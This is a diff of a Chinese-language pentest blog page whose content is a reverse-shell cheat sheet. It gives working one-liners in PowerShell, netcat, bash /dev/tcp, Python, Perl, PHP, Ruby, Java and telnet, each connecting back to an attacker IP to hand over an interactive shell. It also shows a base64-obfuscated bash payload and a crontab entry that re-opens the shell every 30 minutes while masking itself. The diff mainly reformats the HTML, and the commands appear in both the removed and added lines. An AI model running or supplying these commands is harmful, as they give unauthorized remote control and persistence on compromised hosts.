@@ -82,29 +82,19 @@
     [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/shell">shell</a>)
 </div>
 
-      <div>
-
-<p>当你找到一个有命令执行的主机时，你可能想要一个交互式的shell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令</p>
-
+      <div><p>当你找到一个有命令执行的主机时，你可能想要一个交互式的shell，如果你不能添加用户或者添加ssh密钥时，你就需要反弹一个shell来实现，下面的都是反弹shell的命令</p>
 <h3 id="0x00-powershell">0x00 PowerShell</h3>
-
-<pre><code>#更换ip和端口即可
+<pre tabindex="0"><code>#更换ip和端口即可
 本地：nc -lv 8888
-目标：powershell -w hidden -nop -c function RSC{if ($c.Connected -eq $true) {$c.Close()};if ($p.ExitCode -ne $null) {$p.Close()};exit;};$a='10.10.10.10';$p='8888';$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$p);$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;while($os.Peek() -ne -1){$o += $e.GetString($os.Read())};$s.Write($e.GetBytes($o),0,$o.Length);$o=$null;$d=$false;$t=0;while (-not $d) {if ($c.Connected -ne $true) {RSC};$pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) {$r=$s.Read($nb,$pos,$nb.Length - $pos);$pos+=$r;if (-not $pos -or $pos -eq 0) {RSC};if ($nb[0..$($pos-1)] -contains 10) {break}};if ($pos -gt 0){$str=$e.GetString($nb,0,$pos);$is.write($str);start-sleep 1;if ($p.ExitCode -ne $null){RSC}else{$o=$e.GetString($os.Read());while($os.Peek() -ne -1){$o += $e.GetString($os.Read());if ($o -eq $str) {$o=''}};$s.Write($e.GetBytes($o),0,$o.length);$o=$null;$str=$null}}else{RSC}};
-</code></pre>
-
-<h3 id="0x01-netcat">0x01 Netcat</h3>
-
-<pre><code>公网：nc -lv 8888
+目标：powershell -w hidden -nop -c function RSC{if ($c.Connected -eq $true) {$c.Close()};if ($p.ExitCode -ne $null) {$p.Close()};exit;};$a=&#39;10.10.10.10&#39;;$p=&#39;8888&#39;;$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$p);$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName=&#39;cmd.exe&#39;;$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;while($os.Peek() -ne -1){$o += $e.GetString($os.Read())};$s.Write($e.GetBytes($o),0,$o.Length);$o=$null;$d=$false;$t=0;while (-not $d) {if ($c.Connected -ne $true) {RSC};$pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) {$r=$s.Read($nb,$pos,$nb.Length - $pos);$pos+=$r;if (-not $pos -or $pos -eq 0) {RSC};if ($nb[0..$($pos-1)] -contains 10) {break}};if ($pos -gt 0){$str=$e.GetString($nb,0,$pos);$is.write($str);start-sleep 1;if ($p.ExitCode -ne $null){RSC}else{$o=$e.GetString($os.Read());while($os.Peek() -ne -1){$o += $e.GetString($os.Read());if ($o -eq $str) {$o=&#39;&#39;}};$s.Write($e.GetBytes($o),0,$o.length);$o=$null;$str=$null}}else{RSC}};
+</code></pre><h3 id="0x01-netcat">0x01 Netcat</h3>
+<pre tabindex="0"><code>公网：nc -lv 8888
 目标：nc -e cmd.exe 123.123.123.123 8888 #nc -e /bin/sh 10.10.10.10 8888
 
 #获得交互式的shell：
-在得到shell后执行：python -c &quot;import pty; pty.spawn('/bin/bash')&quot;
-</code></pre>
-
-<h3 id="0x02-bash">0x02 Bash</h3>
-
-<pre><code>bash -i &gt;&amp; /dev/tcp/10.10.10.10/8888 0&gt;&amp;1
+在得到shell后执行：python -c &#34;import pty; pty.spawn(&#39;/bin/bash&#39;)&#34;
+</code></pre><h3 id="0x02-bash">0x02 Bash</h3>
+<pre tabindex="0"><code>bash -i &gt;&amp; /dev/tcp/10.10.10.10/8888 0&gt;&amp;1
 注：这个由解析shell的bash完成，有些时候不支持
 
 reber@wyb:~$ cat tmp.txt 
@@ -113,70 +103,40 @@ reber@wyb:~$ cat tmp.txt |base64 -d
 /bin/bash -i &gt;&amp; /dev/tcp/114.115.183.86/6666 0&gt;&amp;1
 
 reber@wyb:~$ {cat,tmp.txt}|{base64,-d}|{bash,-i}
-</code></pre>
-
-<h3 id="0x03-crontab">0x03 crontab</h3>
-
-<pre><code>下面这条命令执行后会每隔30分钟反弹一次：
-(crontab -l;printf &quot;*/30 * * * * exec 9&lt;&gt; /dev/tcp/10.10.10.10/8888;exec 0&lt;&amp;9;
-exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&quot;)|
+</code></pre><h3 id="0x03-crontab">0x03 crontab</h3>
+<pre tabindex="0"><code>下面这条命令执行后会每隔30分钟反弹一次：
+(crontab -l;printf &#34;*/30 * * * * exec 9&lt;&gt; /dev/tcp/10.10.10.10/8888;exec 0&lt;&amp;9;
+exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n&#34;)|
 crontab -
-</code></pre>
-
-<h3 id="0x04-python">0x04 Python</h3>
-
-<pre><code class="language-python"># 下面为1条命令
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,
-socket.SOCK_STREAM);s.connect((&quot;10.10.10.10&quot;,8888));os.dup2(s.fileno(),0); 
-os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'
-</code></pre>
-
-<h3 id="0x05-perl">0x05 Perl</h3>
-
-<pre><code># 下面为1条命令
-perl -e 'use Socket;$i=&quot;10.10.10.10&quot;;$p=8888;socket(S,PF_INET,SOCK_STREAM,
-getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,
-&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
-</code></pre>
-
-<h3 id="0x06-php">0x06 PHP</h3>
-
-<pre><code>php -r '$sock=fsockopen(&quot;10.10.10.10&quot;,8888);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
-</code></pre>
-
-<h3 id="0x07-ruby">0x07 Ruby</h3>
-
-<pre><code># 下面为1条命令
-ruby -rsocket -e'f=TCPSocket.open(&quot;10.10.10.10&quot;,8888).to_i;
-exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)'
-</code></pre>
-
-<h3 id="0x08-java">0x08 Java</h3>
-
-<pre><code># 下面为3条命令
+</code></pre><h3 id="0x04-python">0x04 Python</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># 下面为1条命令</span>
+</span></span><span style="display:flex;"><span>python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,</span>
+</span></span><span style="display:flex;"><span>socket<span style="color:#f92672">.</span>SOCK_STREAM);s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;10.10.10.10&#34;</span>,<span style="color:#ae81ff">8888</span>));os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">0</span>); 
+</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">1</span>); os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">2</span>);p<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>call([<span style="color:#e6db74">&#34;/bin/sh&#34;</span>,<span style="color:#e6db74">&#34;-i&#34;</span>]);<span style="color:#e6db74">&#39;</span>
+</span></span></code></pre></div><h3 id="0x05-perl">0x05 Perl</h3>
+<pre tabindex="0"><code># 下面为1条命令
+perl -e &#39;use Socket;$i=&#34;10.10.10.10&#34;;$p=8888;socket(S,PF_INET,SOCK_STREAM,
+getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,
+&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;
+</code></pre><h3 id="0x06-php">0x06 PHP</h3>
+<pre tabindex="0"><code>php -r &#39;$sock=fsockopen(&#34;10.10.10.10&#34;,8888);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;
+</code></pre><h3 id="0x07-ruby">0x07 Ruby</h3>
+<pre tabindex="0"><code># 下面为1条命令
+ruby -rsocket -e&#39;f=TCPSocket.open(&#34;10.10.10.10&#34;,8888).to_i;
+exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39;
+</code></pre><h3 id="0x08-java">0x08 Java</h3>
+<pre tabindex="0"><code># 下面为3条命令
 r = Runtime.getRuntime()
-p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.10.10.10/8888;cat &lt;&amp;5 | 
-while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
+p = r.exec([&#34;/bin/bash&#34;,&#34;-c&#34;,&#34;exec 5&lt;&gt;/dev/tcp/10.10.10.10/8888;cat &lt;&amp;5 | 
+while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&#34;] as String[])
 p.waitFor()
-</code></pre>
-
-<h3 id="0x09-telnet">0x09 telnet</h3>
-
-<pre><code>两种方法：
+</code></pre><h3 id="0x09-telnet">0x09 telnet</h3>
+<pre tabindex="0"><code>两种方法：
 mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe
 telnet 173.214.173.151 8080 | /bin/bash | telnet 173.214.173.151 8888
 第一种hacker运行：nc -vlp 8080
 第二种hacker运行：nc -vlp 8080和nc -vlp 8888
-</code></pre>
-
-<p><br /></p>
-
-<h4 id="reference-侵删">Reference(侵删)：</h4>
-
-<ul>
-<li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Reverse Shell Cheat Sheet</a></li>
-<li><a href="https://www.91ri.org/6620.html">https://www.91ri.org/6620.html</a></li>
-</ul>
+</code></pre><!-- raw HTML omitted -->
 </div>
     </article>
   </main>
